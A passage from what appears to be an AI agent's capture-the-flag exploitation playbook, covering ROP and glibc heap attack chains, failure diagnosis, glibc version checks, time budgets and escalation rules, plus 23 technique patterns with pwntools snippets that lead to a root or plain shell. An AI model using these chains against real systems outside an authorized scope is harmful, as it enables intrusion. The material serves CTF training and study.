   `canary + pad + [ret, pop_rdi, elf.got['puts'], elf.plt['puts'],
   elf.symbols['main']]`; leak `puts` runtime; loop to `main` for a
   FRESH frame (canary/PIE unchanged in same process — re-verify both).
5. Step 4 — libc computation + stage 2: `libc.address = puts - sym`;
   second leak (`read@GOT`) if libc unshipped (§X6); then
   `[ret, pop_rdi, binsh, system]` (or `one_gadget` try-all loop, §F).
6. Failure joins: stage-1 crash with correct canary = PIE rebase wrong
   (re-check offset site); stage-2 silent exit = bad libc guess
   (re-match with 2nd leak). Never re-run stage 2 on stage-1 assumptions.

Reasoning Checkpoint: `Chain M1 stage=N complete — canary=X, pie=Y, libc=Z|TODO — proceed to next stage?`

### M2 — Heap leak → tcache poison → FILE/return-address finish

1. Step 1 — primitives map (benign, one pass each): which menu ops
   alloc/free/show/edit which index/size; stale-pointer behaviour after
   free (show old data = UAF-read; edit works = poison-capable).
2. Step 2 — heap leak: free two same-size small chunks, UAF-read the
   encoded `fd` (`≥2.32` safe-link mangled) → decode with
   `reveal(pos, enc) = (pos >> 12) ^ enc` once `pos` (chunk address) is
   known — bootstrap `pos` from any raw heap pointer (unsorted-bin `bk`,
   error-message dump, or single unmangled remainder). Verify: decoded
   value must point inside heap range (`vmmap`).
3. Step 3 — libc leak: groom + free a ≥0x400 chunk past full tcache into
   unsorted bin → `fd` = `main_arena`-relative → `libc.address = leak -
   SHIPPED_offset` (computed from shipped libc, §V). Verify low-12 tail
   + `vmmap` libc range before proceeding.
4. Step 4a — finish via tcache→stack/retaddr (preferred `≥2.34`):
   poison to a saved-return-address slot, overwrite with ROP/`one_gadget`.
   Step 4b — finish via FSOP (§X2): poison to `_IO_list_all`/FILE
   `_chain`, plant fake FILE + wide-data, trigger `exit`. Pick ONE finish
   per attempt — never half-build both.
5. Step 5 — trigger discipline: `exit`/menu-quit for FSOP; normal return
   for retaddr. Log which trigger fired; a correct FILE with the wrong
   trigger looks identical to a wrong FILE (see §F).

### M3 — Leakless/partial-leak heap (1-in-16 nibble gamble, fork only)

1. When: NO read primitive at all (write-only heap), glibc ≥2.32,
   forking service (layout stable). Only path: partial pointer overwrite
   + oracle-gated grooming.
2. Step 1 — corrupt a bin `fd` low nibble/byte only (1/16 per nibble):
   target a nearby attacker-influenced chunk or a known structure
   (`stdout` FILE via small-bin adjacency). Oracle: program's next output
   changes (leak!) vs crash (wrong nibble) — parallel workers (N≈8) make
   1/16 fast; SEQUENTIAL 16-try loops time out tiers.
3. Step 2 — first nibble-hit manufactures the missing leak (stdout dump =
   libc leak), converting M3 → M2 mid-chain. Re-baseline immediately:
   new leak value recomputes ALL downstream addresses; discard pre-leak
   guesses.
4. Cost gate: each nibble gamble ≈ 16 probes; two gambles ≈ 256 — budget
   under §T hard-tier only, checkpoint every hit. Third consecutive
   gamble with no oracle change = wrong adjacency hypothesis → re-groom,
   do not keep gambling.

Reasoning Checkpoint: `Chain M<N> stage=S complete — leaks=[...], next=ADDRESS|trigger — proceed?`

## Failure-Mode Catalog + Recovery (§F — detect, then ONE-variable fix)

| # | Failure | Detection (signature) | Recovery (one variable) |
|---|---|---|---|
| F1 | `movaps` misalignment crash | `SIGSEGV` inside `system`/`_int_malloc` prologue, fault addr = aligned libc insn, `rsp % 16 != 0` at call | Prepend ONE bare `ret` before `pop_rdi` (re-align); never rebuild the chain |
| F2 | Bad libc guess (unshipped) | Stage-1 leak OK, stage-2 `system`/`binsh` silent crash or `SIGSEGV` at wild `0x7f..` | Freeze stage 1; take SECOND GOT leak (§X6) and re-match — never retry stage 2 on the same single-leak base |
| F3 | Timeout vs crash ambiguity | `timeout` kill, no core, no output (hang?) vs `SIGSEGV` + core + `bt` | Crash = logic bug (read `bt`, fix ONE field). Timeout = blocked on I/O: check `sendlineafter` prompt bytes, add missing `recvuntil`, verify loop-back symbol exists; never "fix gadgets" for a hang |
| F4 | Seccomp-KILL vs clean exit | KILL: process `killed`, zero output, nonzero-by-signal status. Clean exit: status 0 + empty = wrong path/fd | KILL → dump filter (`seccomp-tools dump`), switch to ORW (§X5). Clean-exit-empty → fix flag path/fd number, keep the chain |
| F5 | `one_gadget` constraint miss | Crash at/near gadget addr, registers violate the printed constraint line (e.g. `[rsp+0x30] != NULL`) | Try-ALL loop: iterate EVERY gadget addr for that libc (script loop, fresh conn each), padding constraint slots (`rsp+0x30` → extra rets/zeros) before abandoning to `system()` |
| F6 | Safe-link raw-pointer poison | `malloc(): unaligned tcache chunk` / `tcache corrupted` abort right after poisoned alloc | `fd` was stored raw: recompute `protect(pos, target) = (pos>>12)^target` with the TRUE `next`-field address as `pos` (needs heap leak); re-verify with `tcache` dump |
| F7 | Stale-PIE / cross-run pairing | Worked locally, dies remotely first stage; leak low-12 sane but high bytes differ run-to-run | Re-leak in the SAME connection that exploits (no cached bases across runs); `elf.address` set per-connection, never global-cached |

Recovery protocol (all failures): (1) classify via the signature column —
no blind retries; (2) change exactly ONE variable; (3) re-run locally
first, remote only after local passes; (4) third identical signature =
STOP, hand off `blocked` with the 500B error tail (§T).

Reasoning Checkpoint: `Failure F<N> classified — signature=S, fix=V — re-run local before remote?`

## Version-Drift Guards (§V — offsets are data, never constants)

1. glibc offsets VARY BY VERSION — never hardcode `main_arena`,
   `__malloc_hook`, `_IO_list_all`, `system`/`binsh` deltas, or gadget
   addresses. Leak-and-compute ONLY: `base = leak - libc.symbols[sym]`
   against the SHIPPED `./libc.so.6` (or the §X6-matched libc). A script
   containing a literal `0x3ebca0`-style constant without a derivation
   comment is REJECTED at self-review.
2. Self-check ritual per run: `log.success(hex(libc.address))`, assert
   `puts == libc.symbols['puts'] + base` for a SECOND symbol (cross-check
   catches wrong-version libc instantly), assert low-12 of each leak
   matches the shipped symbol's low-12.
3. pwntools API drift: `ROP(elf).find_gadget` return shape, `flat`/
   `fit` semantics, `SigreturnFrame` layout, `Ret2dlresolvePayload`
   constructor args, and `gdb.debug(aslr=…)` kwargs drift across 4.x/5.x.
   Pin the working version in the artifact header comment
   (`pwn version`), prefer documented-stable calls (`p64`/`u64`/`flat`
   over exotic helpers), and on `AttributeError` consult local
   `python3 -c "from pwn import *; help(OBJ)"` — never guess new kwargs.
4. `one_gadget` constraint check: EVERY gadget ships constraints
   (`[rsi]==NULL`, `writable: rsp+0x40`, …). Pre-flight each: set NULLs
   via `pop rsi; ret` + `0`, satisfy writable-slots with stack padding,
   then try-all loop (F5). A single-gadget attempt with unchecked
   constraints is a wasted remote try.
5. Gadget/offset portability: binary gadgets (`pop rdi`, `ret`,
   `leave`) come from the TARGET binary per-run (`ROP(elf)`), libc
   gadgets only after the libc base is proven. No libc gadget address
   survives a wrong-version guess — re-derive, never reuse.
6. glibc-era feature gates (memorize, check `ldd`/`strings` version):
   `≥2.24` vtable check · `≥2.26` tcache exists · `≥2.29` tcache key
   (dup blocked) + top-size check · `≥2.32` safe-linking + aligned-check
   · `≥2.34` hooks dead + `_IO_list_all` changed. Pick techniques the
   ERA allows (§X2/X9); era-violating plans are rejected pre-exploit.

Reasoning Checkpoint: `Version guards complete — libc=ID, cross-check=PASS|FAIL, era=E — proceed?`

## Time-Budget Tiers (§T — stop rules per tier, no exceptions)

| Tier | Budget | Scope | Stop rule → outcome |
|---|---|---|---|
| Easy | ≤20 min | E1–E5 skeletons only, shipped libc or ret2win | 10 min no leak → drop to next skeleton; 20 min → `blocked`, hand off best `solve.py` + tail |
| Medium | ≤1 h | + fmt-write, basic tcache, 1 fork-brute (≤2k probes) | 30 min no working leak → escalate plan (§E `/rev`?); 1 h → `blocked` with leak math + failing stage |
| Hard | ≤3 h | + §X playbook, FSOP, 2-leak db match, M1–M3 chains | Checkpoint hourly (leak? base? chain?); any hour with ZERO new confirmed primitive → switch variant ONCE, then escalate |
| Insane | >3 h est | M3 gambles, multi-nibble force, custom FSOP | Do NOT grind: 30-min recon cap → escalate to operator with evidence + projected probe math; continue only on explicit approval |

Global rules: recon ≤60s always; per-`solve.py` run `timeout 120`;
≤3 remote tries per variant; one variable per retry (§F); 3rd identical
crash signature = stop that variant; total per-task attempt log in
`artifacts/<task>/attempts.log` (variant, leak values, outcome).
Timer starts at Baseline — grooming/probing without a confirmed leak
after 50% of tier budget forces variant switch, not deeper grooming.

Reasoning Checkpoint: `Budget check — tier=T, elapsed=E, new-primitive?=Y|N — continue|switch|escalate?`

## Escalation Triggers (§E — call the right helper, with evidence)

1. `/rev` (decompile of checker/menu): trigger when menu semantics are
   ambiguous (unknown struct sizes, hidden commands, custom allocator,
   flag-path logic, input terminators unclear) AND ≥2 black-box probes
   failed to disambiguate. Handoff to `/rev`: binary path, menu bytes
   observed, what struct/logic question blocks the exploit (ONE question).
2. `sessions` skill (persistent debug session): trigger when needing
   multi-step heap/gdb state across turns (`heap`/`bins` evolution,
   breakpoint-at-`malloc` tracing, ASLR-on-vs-off diff). Handoff: binary,
   `gdbscript`, which addresses to watch. This skill still OWNS the
   `solve.py` bytes; `sessions` owns `conn`/`dbg` lifecycle only.
3. Operator (manual binary interaction gate): trigger on HARD gates only —
   manual service interaction required (CAPTCHA/proof-of-work/handshake),
   unbounded brute-force approval (insane-tier probe math), flag-submit
   confirmation, or scope ambiguity (is this host:port in scope?).
   Signal via `tools/operator_ping.sh "<need>" loop`, keep solving
   unblocked work in parallel; never stall the whole task on one gate.
4. Non-triggers (do NOT escalate): solvable-by-skeleton (just exploit),
   single-variable crash (apply §F), bad-libc-guess (apply §X6), timeout
   (fix I/O framing first). Escalation without the required evidence
   (leak values, crash tail, probe log) is rejected — attach all three.

Reasoning Checkpoint: `Escalation check — blocked-on=X, evidence=[leak,tail,log] — self-fix|/rev|sessions|operator?`

## Worked End-to-End Example (§W — abstract generic binary, technique-only)

> Fictional `vuln`: 64-bit, NX on, canary + PIE + Full RELRO, menu with
> alloc/free/show/edit + `quit→exit`. Shipped `./libc.so.6` (modern,
> hooks dead). NO real service, NO flag value — technique flow only.

1. Baseline (≤60s): `checksec` → canary+PIE+NX+FullRELRO; `file`/`ldd` →
   64-bit, modern glibc; `nm -D` → no `win`/`system`; manual run →
   menu bytes `1/2/3/4/quit`, indices `0..7`, sizes asked. Verdict: heap
   path, Full RELRO ⇒ no GOT/ret2dlresolve; hooks dead ⇒ no hook target;
   plan = M2 (heap leak → libc leak → tcache → retaddr), fallback FSOP.
2. Confirmation: `alloc(0,0x28,"A"*8); alloc(1,0x28,"B"*8); free(0);
   free(1); show(1)` returns 8 nonzero bytes = UAF-read of mangled fd
   (safe-link era confirmed); `alloc(6,0x500,…); free(6)` past filled
   tcache + `show(6)` returns `0x7f..` = unsorted-bin `main_arena` leak.
   Gadget inventory: `pop rdi`, bare `ret`, `leave` all present.
3. Negative (≤3 probes): Full RELRO ⇒ GOT-write plans dropped; hooks
   absent in shipped libc (`nm -D ./libc.so.6 | grep hook` → none
   called) ⇒ hook plans dropped; single-leak libc-db unnecessary (shipped
   libc ranks higher — §X6 ladder).
4. Exploit, stage 1 (heap leak): groom `A B C guard`, free `B A` order so
   `A` is head; UAF-read `A`'s fd; bootstrap `pos` from the unsorted `bk`
   (raw heap pointer in same dump) → `heap_base = reveal(pos, enc) &
   ~0xfff`-style page math per observed mapping; assert in `vmmap` range.
5. Exploit, stage 2 (libc base): `libc.address = arena_leak -
   libc.symbols['puts']`-delta computed from SHIPPED libc (never a pasted
   constant); cross-check second symbol (§V); derive `system`, `binsh`,
   `pop_rdi_libc`, `ret_libc`; log all with `log.success`.
6. Exploit, stage 3 (tcache→retaddr): `protect(pos, target)` poison to a
   saved-return slot (stack address from `environ`-leak or prior stack
   disclosure — same-run only); overwrite with `[ret, pop_rdi, binsh,
   system]`; on `movaps` crash apply F1 (+`ret`); on constraint crash try
   `one_gadget` try-all (F5). Trigger = normal return (NOT `quit`, which
   would take the exit/FSOP path with an unfinished FILE).
7. Validation-handoff: re-run ×2 locally (ASLR flake check), transcript
   with flag redacted, handoff = command + offset + canary/PIE/libc math
   + technique line (`M2 tcache→retaddr, shipped-libc, F1 applied|none`).
   Remote fail + local pass ⇒ `blocked(remote)` ≤3 tries + 500B tail.

Reasoning Checkpoint: `Example trace complete — pattern=M2, stages=3/3, technique=X — end.`

## Writeup-Distilled Patterns (W1..W30)

> All patterns mined from `knowledge/writeups_mined/pwn_manifest.md` (2022-2026 hard
> writeups). Each: name → recognition signals → exact steps → snippet → pitfalls →
> sources. Glibc version noted per pattern. No duplicates of E1-E5/X1-X9 cores —
> these are concrete writeup variants with failure lessons.

### W1 — Apple2 wide-vtable doallocate (glibc 2.34+, hooks dead)
- Signals: Full RELRO + shipped 2.34/2.35/2.39 libc + heap UAF/write over FILE + `exit`/menu-quit trigger.
- Steps: libc leak → heap leak → tcache poison to `_IO_list_all`/`_chain` → fake FILE (vtable=`_IO_wfile_jumps-0x20`, `_wide_data`=scratch, `_IO_save_end`=system) → `exit`.
- Snippet: `fs.vtable=libc.sym._IO_wfile_jumps-0x20; fs._wide_data=scratch; fs._IO_save_end=libc.sym.system` + `edit(fd,p64(protect(pos,_IO_list_all)))`.
- Pitfalls: forged vtable fails `_IO_vtable_check` — must use real table minus offset; wrong `_wide_data` NULL kills path; trigger must be `exit`, not normal return.
- Sources: https://ctftime.org/writeup/38153 · https://github.com/hax1ng/midnightctf2026-writeups/blob/main/pwn/heapnote/README.md · https://github.com/ZhangZhuoSJTU/ctf-collection/blob/main/ctf-pwn/dicectf_2026_garden/hints/hint2.md

### W2 — Orange top-shrink free-without-free (all glibc, esp. 2.35 no-free)
- Signals: no `free`/delete menu, `gets`/overflow + echo/show, Full RELRO+PIE.
- Steps: overflow top `size` to small page-aligned (PREV_INUSE kept) → over-request alloc → sysmalloc retires old top to unsorted → echo fd/bk = libc+heap leak → proceed to M2.
- Snippet: `edit(off, p64(0)+p64(0x1001)) # shrink top; alloc(huge) # force sysmalloc` then `show() → u64(fd)-OFF`.
- Pitfalls: size must satisfy page-align + `>=0x20` + PREV_INUSE; pre-shrink echo has no leak — must echo AFTER over-request; 2.26+ no longer calls flush on malloc_printerr — use `exit`/`abort` trigger only.
- Sources: https://picoctfsolutions.com/picoctf-2024-high-frequency-troubles · https://pwn2ooown.tech/ctf/writeup/2024/06/10/picoCTF-HFT · https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_orange.c

### W3 — Botcake unsorted+tcache overlap (glibc 2.29+, key era)
- Signals: double-free blocked by `tcache double free detected`, 7-fill possible, adjacent chunks, UAF edit.
- Steps: fill tcache(7) → free victim→unsorted → free neighbor→consolidate → drain 1 → re-free victim→tcache (dual-presence) → overlap alloc → poison fd with `protect`.
- Snippet: `for i in range(7): free(x[i]); free(a); free(prev); alloc(1); free(a); unsorted=alloc(big); unsorted[off]=protect(a,target)`.
- Pitfalls: naive `free(a);free(a)` aborts on 2.29+ — must route first free via unsorted; safe-link still needs heap leak on 2.32+.
- Sources: https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c · https://yunolay.com/house-of-botcake · https://ctftime.org/writeup/34812

### W4 — Large-bin bk_nextsize write (glibc 2.30+, raw nextsize)
- Signals: large sizes ≥0x400, UAF/overflow into largebin chunk, tcache full/isolated, Full RELRO.
- Steps: groom p1>p2 same bin → leak libc via unsorted fd → corrupt p1 `bk_nextsize`/`fd_nextsize` → alloc p2 (smaller) triggers sorted-insert write `target = heap-addr` → target `_IO_list_all`/struct.
- Snippet: `p2_bk_nextsize = target-0x20  # insert writes p1 addr` + verify `size p2 < p1` else branch missed.
- Pitfalls: 2.30+ integrity check kills larger-than-smallest path — must make inserted chunk SMALLER; nextsize pointers raw (no safe-link) but need exact offsets from shipped libc.
- Sources: https://4xura.com/binex/heap/large-bin-attack · https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/large_bin_attack · https://github.com/shellphish/how2heap/blob/master/glibc_2.35/large_bin_attack.c

### W5 — Einherjar off-by-null backward consolidate (glibc 2.23-2.41)
- Signals: `scanf %s`/strcpy null-overflow 1B, adjacent chunks, heap leak available, no direct UAF.
- Steps: forge fake `prev_size` + clear `PREV_INUSE` via null → `free(next)` consolidates backward over fake → overlapping chunks → UAF read/write → tcache poison.
- Snippet: `edit(a, b'A'*24+p64(0x31)) # clear INUSE, fake prev_size; free(b) # consolidate`.
- Pitfalls: fake size must pass `chunksize` + `prev_inuse` checks; needs heap leak for fake placement; tcache follow-up still needs safe-link encode on 2.32+.
- Sources: https://itaybel.github.io/sekaictf2023 · https://hacktricks.wiki/en/binary-exploitation/libc-heap/house-of-einherjar.html · https://github.com/shellphish/how2heap/blob/master/glibc_2.41/house_of_einherjar.c

### W6 — Spirit fake-chunk free (glibc 2.23-2.42, tcache variant easy)
- Signals: controlled pointer passed to `free` (stack/.bss/heap buffer), no overflow needed, size field writable.
- Steps: forge `size=0x40` (+ successor `0x40` on pre-2.26) at aligned addr → `free(ptr+0x10)` → `malloc(same)` returns fake → write target (retaddr/GOT/struct).
- Snippet: `fake[1]=0x40; fake[9]=0x40; free(&fake[2]); p=malloc(0x30) # p==&fake[2]`.
- Pitfalls: IS_MMAPPED/NON_MAIN_ARENA bits must be 0; 16B align required; pre-2.26 needs plausible next-size, 2.26+ tcache skips it — check version first.
- Sources: https://grxer.github.io/2023/03/17/2014-hack-lu-oreo · https://github.com/shellphish/how2heap/blob/master/glibc_2.39/tcache_house_of_spirit.c · https://algoatson.github.io/p/house-of-spirit

### W7 — Lore smallbin bck->fd inject (glibc 2.35 hardened)
- Signals: smallbin-size UAF, ability to corrupt `bk`, fake freelist area, 7-dummy fill possible.
- Steps: fill tcache → victim to smallbin → corrupt `victim->bk` to fake → `malloc` smallbin-unlink bypass (`bck->fd==victim` check) → fake returned → arbitrary write.
- Snippet: `victim[1]=stack_buf; stack_buf[2]=victim; stack_buf[3]=fake_freelist # satisfy bck->fd==victim`.
- Pitfalls: 2.35+ `bck->fd != victim` abort — must plant correct forward link; smallbin-to-tcache path complicates — drain tcache first.
- Sources: https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_lore.c · https://github.com/Kur1sulab/blackbox/blob/main/hack-heap-exploitation/HOUSE_OF_TECHNIQUES.md

### W8 — Force wraparound alloc (glibc <2.29 only)
- Signals: top-size overwrite + controllable malloc size + `strcpy`/`read` write, Partial RELRO or hook target, old libc (2.23-2.28).
- Steps: overwrite top `size=0xffffffffffffffff` → request `nb = target-8-top` (32b wrap allowed) → next `malloc` returns `target-8` → write GOT/hook.
- Snippet: `wrap = 0xFFFFFFFFFFFFFFFF-heap_addr+target; alloc(wrap); alloc_at_target(data)`.
- Pitfalls: DEAD on 2.29+ (`corrupted top size`) — check `ldd` first; 64b wrap needs huge nb, 32b easier; single-write constraint — spend it on top size only.
- Sources: https://ctftime.org/writeup/37988 · https://zino.kr/blog/dreamhack-house-of-force-writeup · https://hacktricks.wiki/en/binary-exploitation/libc-heap/house-of-force.html

### W9 — Unsorted fd/bk leak + bk->fd write (glibc <2.28 write, all leak)
- Signals: free ≥0x90 or 7-fill then free, UAF `show` reads fd/bk, Partial RELRO or `global_max_fast` reachable.
- Steps: leak: `fd=main_arena+96` → `libc=fd-OFF` (version-specific) → write (pre-2.28): corrupt `bk` to `target-0x10` → alloc same size triggers `bk->fd` write of arena addr.
- Snippet: `libc.address=u64(show())-MAIN_ARENA_OFF; edit(bk, p64(target-0x10)) # pre-2.28 only`.
- Pitfalls: 2.28+ `bck->fd != victim` guard kills write — use leak-only on modern; 1-leak offset varies 2.27≠2.31≠2.35 — cross-check second symbol.
- Sources: https://hacktricks.wiki/en/binary-exploitation/libc-heap/unsorted-bin-attack.html · https://yunolay.com/unsorted-bin-attack-and-leaking-libc · https://ctftime.org/writeup/26043

### W10 — tcache_perthread_struct hijack (glibc 2.26+)
- Signals: single-chunk or count-limited menu, UAF/overflow near tcache struct, heap leak via struct.
- Steps: leak heap → compute `tcache_struct = heap+off` → corrupt `counts[]` (set 7) to force unsorted OR corrupt `entries[]` to target → alloc returns arbitrary.
- Snippet: `idx=(struct-chunk)//8; edit(idx, p64(7)+p64(target)) # counts then entries`.
- Pitfalls: struct offset varies per run — derive from heap leak, never hardcode; `counts` byte vs `entries` qword confusion — sketch struct first.
- Sources: https://ctftime.org/writeup/39574 · https://github.com/n4ctbyte/ctf-writeups/blob/main/b01lers-ctf-2026/priority-queue.md · https://picoctfsolutions.com/picoctf-2024-high-frequency-troubles

### W11 — Safe-link bootstrap without heap leak (glibc 2.32+)
- Signals: mangled fd observed, no direct heap pointer, `show` prints mangled, fork or z3 available.
- Steps: read mangled `enc` → if low12 known or brute 1/16 nibble → `heap=(enc ^ (enc>>12) ...)` iterative reveal OR z3 `(res>>12)^res==leak` with `0x55<=res>>24<=0x57` → then `protect(pos,t)`.
- Snippet: `reveal=lambda pos,enc:(pos>>12)^enc` + `z3: s.add((res>>12)^res==leak)` (see n132 open-house).
- Pitfalls: single-nibble guess 1/16 — parallelize, checkpoint; double-protect paths apply protect twice — detect via `tcache` dump mismatch.
- Sources: https://n132.github.io/2023/05/31/DC31-Qual-Copy.html · https://blog.elmo.sg/posts/defcon-rtv-2025 · https://shellphish-how2heap.mintlify.app/techniques/advanced/safe-linking

### W12 — Tcache stashing / cross-bin promotion (glibc 2.29-2.35)
- Signals: smallbin + tcache interaction, calloc/malloc_consolidate, size-change via 1B overflow.
- Steps: change freed size (e.g. 0x118→0x20) → free lands in different bin → stashing unlink moves smallbin→tcache with controlled fd → poison.
- Snippet: `edit(a, b'A'*off+p16(0x20)) # shrink size; free(a) # lands tcache-0x20`.
- Pitfalls: size must remain valid bin size + align; consolidation may swallow victim — keep guard chunk.
- Sources: https://github.com/ljagiello/ctf-skills/blob/main/ctf-pwn/heap-techniques.md · https://github.com/Project-SweepDuck/sweepduck-ctf-skills/blob/main/ctf-pwn/heap-techniques.md

### W13 — Fastbin-dup pre-2.29 + key-clear (glibc 2.27-2.28 vs 2.29+)
- Signals: double-free primitive, `edit` after free, Partial RELRO + GOT or hook target, old libc.
- Steps (pre-2.29): `free(a);free(b);free(a)` → `edit(a,p64(target))` → `alloc;alloc;alloc→target` → overwrite GOT/hook.
- Snippet: `free(1);free(2);free(1); edit(1,p64(got_free)); alloc();alloc(); alloc_to_target(system)`.
- Pitfalls: 2.29+ `key` field aborts naive dup — must clear `chunk+0x18` or use Botcake; size-field integrity (`fake+0x8` valid) still checked.
- Sources: https://ctftime.org/writeup/26043 · https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html · https://ctftime.org/writeup/12489

### W14 — Stdout _IO_write leak starter (any modern glibc)
- Signals: heap overlap over `_IO_2_1_stdout_`, `puts`/`printf` after corrupt, no crash yet.
- Steps: corrupt `_flags`/`_IO_write_base`/`_IO_write_ptr` so next output dumps chosen memory → parse libc/heap/stack → upgrade to full FSOP/ROP only if needed.
- Snippet: `edit(stdout_chunk, p64(flags)+p64(0)+p64(base-0x20)+p64(base)) # ptr>base triggers`.
- Pitfalls: `_mode<=0` + `ptr>base` both required or flush skipped; over-shift dumps garbage — move base by 0x20-0xE0 steps and re-read.
- Sources: https://ctftime.org/writeup/36479 · https://github.com/nobodyisnobody/write-ups/tree/main/MetaCtf.2021/pwn/Hookless · https://niftic.ca/posts/fsop

### W15 — Vtable-choice per era (glibc 2.23-2.39)
- Signals: FILE write primitive + libc leak, need code-exec via flush.
- Steps: `<2.24` forged vtable direct; `2.24-2.27` real `_IO_str_jumps` + `__overflow` malloc-memcpy; `≥2.28` real `_IO_wfile_jumps` → `_wide_data->_wide_vtable` (unchecked); `≥2.34` Apple2 doallocate slot.
- Snippet: `vtable = libc.sym._IO_wfile_jumps-0x20 if ver>=(2,28) else libc.sym._IO_str_jumps`.
- Pitfalls: `_IO_vtable_check` range-check kills forged tables on 2.24+ — always point at real table; wide path needs fake `_wide_data` + fake wide-vtable pair.
- Sources: https://github.com/mahaloz/ctf-wiki-en/blob/master/docs/pwn/linux/io_file/fsop.md · https://hornos3.github.io/2023/02/28/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v1-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F · https://www.cnblogs.com/trunk/p/17133572.html

### W16 — TLS dtor_list / __exit_funcs finish (glibc 2.34+, hookless)
- Signals: heap + libc leaks, arbitrary alloc (tcache poison), `exit`/return path, hooks dead.
- Steps: poison to `tls_storage` (heap-adjacent or computed `libc+off`) → forge `dtor_list [func,args,next]` → `exit` walks list → `system("/bin/sh")` or ROP.
- Snippet: `poison(tls_dtor); write(p64(system)+p64(binsh)+p64(0)) # next=NULL terminates`.
- Pitfalls: `fs:0x30` random must be zeroed/erased or walk crashes; singly-linked — chain carefully; offset `tls-0x80+0x28/0x30` varies — confirm via `vmmap`.
- Sources: https://ctftime.org/writeup/35597 · https://ctftime.org/writeup/38138 · https://github.com/johnathanhuutri/CTFWriteup/blob/master/2022/0CTF-2022/BabyHeap-2022/README.md

### W17 — rtld/fini finish when FILE blocked (glibc 2.35)
- Signals: `gets`/overflow + Full RELRO + no FILE path, `l->l_info`/`_rtld_global` reachable via poison.
- Steps: overwrite `l_info[DT_FINI_ARRAY]` to forged `_fini_array [onegadget]` OR `_rtld_global+3848 dl_load_lock` pivot + `setcontext` → ROP.
- Snippet: `edit(fini_slot, p64(fake_array)); edit(fake_array, p64(onegadget))`.
- Pitfalls: `_fini_array` size field must be sane; `setcontext` needs full `mcontext` + `rdi==0` for common gadgets — pre-set via prior write.
- Sources: https://github.com/nobodyisnobody/write-ups/tree/main/DanteCTF.2023/pwn/Sentence.To.Hell · https://github.com/nobodyisnobody/write-ups/tree/main/imaginary.CTF.2022/pwn/rope

### W18 — environ to stack base (any glibc with libc leak)
- Signals: libc leak + arbitrary alloc/read, need stack address for ROP/pivot, `environ` in shipped libc.
- Steps: `stack_leak = u64(read(libc.sym.environ))` → `stack_base = leak - off` → place ROP at known stack or compute saved-RIP slot → poison to slot.
- Snippet: `environ_addr=libc.sym.environ; stack=u64(view(environ_addr)); rbp_slot=stack-0x120 # confirm via vmmap`.
- Pitfalls: `environ` points to `argv` area, not saved-RIP — adjust by fixed delta per binary; ASLR slides together — same-run leak mandatory.
- Sources: https://github.com/nobodyisnobody/write-ups/tree/main/BSides.Algiers.2023/pwn/just.pwnme · https://ctftime.org/writeup/37042 · https://github.com/a2ure123/ctf-pwn-skill/blob/main/skill/ctf-pwn/references/glibc-heap-version-map.md

### W19 — setcontext mcontext pivot via FSOP (glibc 2.34+ SUID/Full RELRO)
- Signals: FILE control + wide-vtable path + need full register control, SUID `system` trap (dash drops priv).
- Steps: FILE `_wide_vtable[doallocate]` → `setcontext+61` → forged `mcontext (rdi=0, rsi, rdx, rip=ROP, rsp=pivot)` → `setuid(0)` then `system("/bin/sh")`.
- Snippet: `wide_vtable[0x68//8]=libc.sym.setcontext+61; mcontext.rdi=0; mcontext.rip=rop_start`.
- Pitfalls: `rdi==NULL` required for common `execve(rdi)` gadgets — verify `rdi==0` at pivot (fgets clobbers); SUID + `system` without `setuid(0)` loses root.
- Sources: https://github.com/hax1ng/midnightctf2026-writeups/blob/main/pwn/heapnote/README.md · https://niftic.ca/posts/fsop

### W20 — one_gadget try-all with pad (any glibc, after libc base)
- Signals: libc base proven, `system` crashes (movaps) or no `/bin/sh`, `one_gadget` lists 2-4 candidates with constraints.
- Steps: for each gadget: pad `rsp+0x30/0x40` with zeros/rets + zero `rsi/rdx` via `pop rsi;ret` → fresh conn per try → log constraint fail regs.
- Snippet: `for g in [0x45226,0x4527a,0xf02a4]: pay=flat({OFF:[ret,pop_rsi,0,pop_rdx,0,libc+g]}) # fresh mk() each`.
- Pitfalls: single-gadget attempt wastes remote tries — always loop all; `[rsp+0x30]==NULL` means stack slot must be zero — add explicit `p64(0)` pad.
- Sources: https://ctftime.org/writeup/37988 · https://hackmd.io/@SBK6401/Bk4dQYkoi · https://github.com/fei9747/one_gadget

### W21 — DynELF unknown-libc resolve (no shipped libc, leak-only)
- Signals: no shipped libc, single read/format leak primitive, PLT `write`/`puts` present, remote-only libc.
- Steps: leak via `write(1,got,8)` loop → feed to `DynELF(leak_fn, elf)` → auto-resolve `system`/`binsh` → final `system("/bin/sh")` without db.
- Snippet: `d=DynELF(lambda a,n: leak(a,n), elf); system=d.lookup('system') # needs stable leak_fn`.
- Pitfalls: leak_fn must be repeatable (loop to main) — one-shot leaks fail; slow — prefer 2-leak db if two GOTs available.
- Sources: https://github.com/keeslient/codex-ctf-skills-/blob/main/ctf-pwn/rop-and-shellcode.md · https://n132.github.io/2023/05/31/DC31-Qual-Copy.html

### W22 — ret2csu no-pop-rdi (has __libc_csu_init, no gadgets)
- Signals: 64b, no `pop rdi`, has `__libc_csu_init` + `write`/`read` PLT, need leak.
- Steps: `ret2csu(rbx=0,rbp=1,r12=fd,r13=got,r14=size,r15=addr)` → `write` leak → loop → `ret2csu` to `system` OR `read` then ROP.
- Snippet: `rop.ret2csu(0,1,1,elf.got.read,8,elf.bss(),0); rop.call(main) # then stage2`.
- Pitfalls: `ret_last`/`ret` alignment + `rbx==0,rbp==1` handshake — copy canonical template, do not reorder; clobbers `r15` as ret — set explicitly.
- Sources: https://github.com/nonamed01/exploits/blob/main/docs/source/writeups/HTB-Void-writeup.rst · https://netorika.medium.com/picoctf-lockdown-horses-binary-exploitation-writeup-a27c13c3b752

### W23 — Partial-overwrite fork PIE (fork-stable, no leak)
- Signals: fork-without-execve, PIE on, nearby target (win/main+offset), low-12 page-stable.
- Steps: verify stability (same byte ×3 reconnects) → overwrite RIP low 1-2B only (`&0xfff` stable) → 1/16 per nibble brute → win/loop.
- Snippet: `pay=flat({OFF: p8((orig_low&0xf000)|0x123)}) # 1 nibble; loop 16 with oracle`.
